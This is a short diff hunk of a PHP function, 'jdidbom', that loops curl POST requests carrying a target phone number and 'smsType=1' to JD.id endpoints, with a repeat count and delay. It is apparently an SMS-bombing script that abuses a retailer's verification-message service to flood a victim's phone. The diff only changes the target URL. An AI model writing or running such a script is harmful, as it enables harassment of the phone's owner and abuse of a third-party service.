@@ -3,7 +3,7 @@ function jdidbom($no, $jum, $wait){
     $x = 0; 
     while($x < $jum) {
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
+        curl_setopt($ch, CURLOPT_URL,"https://passport.jd.id/login?ltype=logout#/passwordLogin");
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
